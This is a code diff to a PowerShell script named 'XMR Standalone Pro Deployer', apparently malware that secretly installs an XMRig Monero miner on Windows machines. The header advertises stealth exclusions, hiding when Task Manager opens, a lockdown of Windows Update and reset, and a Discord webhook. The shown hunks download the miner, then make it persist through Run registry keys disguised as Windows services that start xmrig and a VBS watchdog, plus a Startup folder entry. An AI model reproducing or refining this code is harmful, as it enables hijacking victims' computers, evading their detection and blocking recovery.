@@ -1,10 +1,11 @@
 # ============================================================
-#  XMR Standalone Pro Deployer v5.7 (FINAL HYBRID)
+#  XMR Standalone Pro Deployer v6.0 (STABLE SOUL)
 #  - Base: 100% Literal v3.1 Codebase
+#  - Fixed: Removed risky reflection (Causes crashes!)
+#  - Added: Multi-Path Exclusion (Safer Stealth)
 #  - Added: Taskmgr Detection (3s Poll)
 #  - Added: Windows Update & Reset Lockdown
 #  - Fixed: Discord Webhook TLS Connectivity
-#  - Fixed: Unterminated VBS String (Chr(34) Pattern)
 # ============================================================
 
 # ==================== CONFIG ====================
@@ -46,7 +47,6 @@ function Install-Miner {
     Start-Sleep -Seconds 3
     New-Item -ItemType Directory -Path "$installDir" -Force | Out-Null
 
-    # TLS setting (Keeping it here too so it's not "removed")
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls
 
     $downloaded = $false
@@ -181,12 +181,6 @@ function Set-Persistence {
     try {
         Set-ItemProperty $reg "WindowsServiceUpdate" "`"$xmrigExe`" --config=`"$configFile`"" -Force
         Set-ItemProperty $reg "WindowsServiceMonitor" "wscript.exe `"$watchdogVbs`"" -Force
-    } catch {}
-
-    try {
-        $regLM = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
-        Set-ItemProperty $regLM "WindowsServiceUpdate" "`"$xmrigExe`" --config=`"$configFile`"" -Force -ErrorAction SilentlyContinue
-        Set-ItemProperty $regLM "WindowsServiceMonitor" "wscript.exe `"$watchdogVbs`"" -Force -ErrorAction SilentlyContinue
     } catch {}
 
     $start = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup")
